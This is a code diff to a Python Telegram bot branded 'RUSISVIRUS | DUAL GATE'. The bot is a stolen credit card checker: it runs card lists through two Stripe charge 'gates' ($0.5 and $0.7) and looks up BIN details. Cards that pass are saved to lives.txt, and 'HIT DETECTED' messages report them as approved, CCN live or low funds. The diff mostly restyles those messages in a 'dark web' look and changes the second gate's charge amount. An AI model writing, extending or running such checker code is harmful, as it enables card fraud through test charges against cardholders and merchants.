@@ -18,7 +18,7 @@ ALLOWED_IDS = ['1915369904', '7103090839']
 # ==========================================
 def check_double_gate(cc):
     # -------------------------------------
-    # 1️⃣ Gate 1 Check ("Payment Successful!")
+    # 1️⃣ Gate 1 Check (Original Response)
     # -------------------------------------
     try:
         last = str(func_timeout(100, Gate1, args=(cc,)))
@@ -29,7 +29,7 @@ def check_double_gate(cc):
         return f"{last} (Gate 1 ✅)"
     
     # -------------------------------------
-    # 2️⃣ Gate 2 Check ("Donation Successful!")
+    # 2️⃣ Gate 2 Check (Original Response)
     # -------------------------------------
     else:
         try:
@@ -44,21 +44,23 @@ def check_double_gate(cc):
             return "Decline⛔"
 
 # ==========================================
-# 🎨 UI FUNCTION
+# 🎨 DASHBOARD UI (PROGRESS)
 # ==========================================
 def get_dashboard_ui(total, current, live, die, ccn, low, cvv, threeds, last_cc, last_response):
     percent = int((current / total) * 100) if total > 0 else 0
     display_cc = last_cc if len(last_cc) >= 10 else "Wait..."
-    display_response = (last_response[:35] + "...") if len(last_response) > 35 else last_response
-    line = "━━━━━━━━━━━━━━━━━━"
     
+    # Dashboard မှာတော့ အတိုကောက်ပဲ ပြမယ်
+    display_response = (last_response[:30] + "...") if len(last_response) > 30 else last_response
+    
+    line = "━━━━━━━━━━━━━━━━━━"
     text = (
         f"{line}\n"
         f"• <b>RUSISVIRUS | DUAL GATE 🇲🇲</b>\n"
         f"{line}\n"
         f"• <code>{display_cc}</code>\n"
-        f"• <b>Result:</b> {display_response}\n"
-        f"• <b>Gate 1 ($0.5) ➜ Gate 2 ($0.5)</b>\n"
+        f"• <b>Status:</b> {display_response}\n"
+        f"• <b>Gate 1 ($0.5) ➜ Gate 2 ($0.7)</b>\n"
         f"{line}\n"
         f"• <b>Hits:</b> {live}    • <b>Dead:</b> {die}\n"
         f"• <b>CVV:</b>  {cvv}    • <b>CCN:</b>  {ccn}\n"
@@ -85,7 +87,7 @@ def main(message):
     t.start()
 
 # ==========================================
-# 🚀 CHECKER LOGIC (UPDATED)
+# 🚀 CHECKER LOGIC (DARK WEB UI UPDATE)
 # ==========================================
 def run_checker(message):
     dd = 0; live = 0; ch = 0; ccn = 0; cvv = 0; lowfund = 0; threeds = 0
@@ -108,42 +110,92 @@ def run_checker(message):
                 cc = cc.strip()
                 if os.path.exists(stop_file): break
 
-                # BIN Lookup (Simple)
+                # BIN Lookup
                 try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
                 except: data = {}
-                brand = data.get('brand','Unknown'); country = data.get('country_name','Unknown'); bank = data.get('bank','Unknown')
+                brand = data.get('brand','Unknown')
+                card_type = data.get('type','Unknown')
+                country = data.get('country_name','Unknown')
+                country_flag = data.get('country_flag', '')
+                bank = data.get('bank','Unknown')
 
                 start_time = time.time()
                 
-                # 🔥 CALL DOUBLE CHECK FUNCTION
+                # 🔥 CALL DOUBLE CHECK
                 last = check_double_gate(cc)
                 
                 execution_time = time.time() - start_time
                 
-                # Update UI periodically
+                # Update Dashboard UI periodically
                 if "Successful" in last or "funds" in last or "security code" in last or (index%8==0):
                     view_text, markup = get_dashboard_ui(total, index, ch, dd, ccn, lowfund, cvv, threeds, cc, last)
                     try: bot.edit_message_text(chat_id=chat_id, message_id=ko, text=view_text, reply_markup=markup)
                     except: pass
                 
                 print(f"{cc} -> {last}")
-                line = "━━━━━━━━━━━━━━━━━━"
 
-                # 🟢 SUCCESS HANDLING
-                if 'Successful' in last:  # Covers both "Payment Successful!" and "Donation Successful!"
+                # ---------------------------------------------
+                # 🔥 DETERMINE GATEWAY NAME 🔥
+                # ---------------------------------------------
+                if "Gate 1" in last:
+                    gate_display = "Stripe 0.5$"
+                elif "Gate 2" in last:
+                    gate_display = "Stripe 0.7$"
+                else:
+                    gate_display = "Auth / Charge"
+
+                # ---------------------------------------------
+                # 🟢 RESULT MESSAGES (DARK STYLE)
+                # ---------------------------------------------
+                
+                # 1. APPROVED / CHARGED (Hit)
+                if 'Successful' in last:
                     ch += 1
                     with open("lives.txt", "a") as f: f.write(f"{cc} - {last}\n")
-                    msg = f"{line}\n• <code>{cc}</code>\n• <b>Result:</b> {last} ✅\n{line}\n• <b>Bin:</b> {brand}\n• <b>Bank:</b> {bank}\n• <b>Country:</b> {country}\n• <b>Time:</b> {execution_time:.1f}s\n{line}\n<b>Bot by: @Rusisvirus</b>"
+                    
+                    msg = f'''💀 <b>HIT DETECTED</b> 💀
+━━━━━━━━━━━━━━
+🏴‍☠️ <b>CC:</b> <code>{cc}</code>
+🩸 <b>Response:</b> APPROVED! 🔥
+━━━━━━━━━━━━━━
+🕸 <b>Type:</b> {brand} - {card_type}
+🗺 <b>Region:</b> {country} {country_flag}
+🔪 <b>Gate:</b> {gate_display}
+⏳ <b>Time:</b> {execution_time:.1f}s
+━━━━━━━━━━━━━━
+👤 <b>Dev: @Rusisvirus</b>'''
                     bot.reply_to(message, msg)
                 
+                # 2. CCN LIVE
                 elif 'security code' in last:
                     ccn += 1
-                    msg = f"{line}\n• <code>{cc}</code>\n• <b>Result:</b> CCN LIVE ✅\n{line}\n<b>Bot by: @Rusisvirus</b>"
+                    msg = f'''💀 <b>HIT DETECTED</b> 💀
+━━━━━━━━━━━━━━
+🏴‍☠️ <b>CC:</b> <code>{cc}</code>
+🩸 <b>Response:</b> CCN LIVE ✅
+━━━━━━━━━━━━━━
+🕸 <b>Type:</b> {brand} - {card_type}
+🗺 <b>Region:</b> {country} {country_flag}
+🔪 <b>Gate:</b> {gate_display}
+⏳ <b>Time:</b> {execution_time:.1f}s
+━━━━━━━━━━━━━━
+👤 <b>Dev: @Rusisvirus</b>'''
                     bot.reply_to(message, msg)
                     
+                # 3. LOW FUNDS
                 elif 'funds' in last:
                     lowfund += 1
-                    msg = f"{line}\n• <code>{cc}</code>\n• <b>Result:</b> INSUFFICIENT FUNDS 🚫\n{line}\n<b>Bot by: @Rusisvirus</b>"
+                    msg = f'''💀 <b>HIT DETECTED</b> 💀
+━━━━━━━━━━━━━━
+🏴‍☠️ <b>CC:</b> <code>{cc}</code>
+🩸 <b>Response:</b> LOW FUNDS 💰
+━━━━━━━━━━━━━━
+🕸 <b>Type:</b> {brand} - {card_type}
+🗺 <b>Region:</b> {country} {country_flag}
+🔪 <b>Gate:</b> {gate_display}
+⏳ <b>Time:</b> {execution_time:.1f}s
+━━━━━━━━━━━━━━
+👤 <b>Dev: @Rusisvirus</b>'''
                     bot.reply_to(message, msg)
                 
                 else:
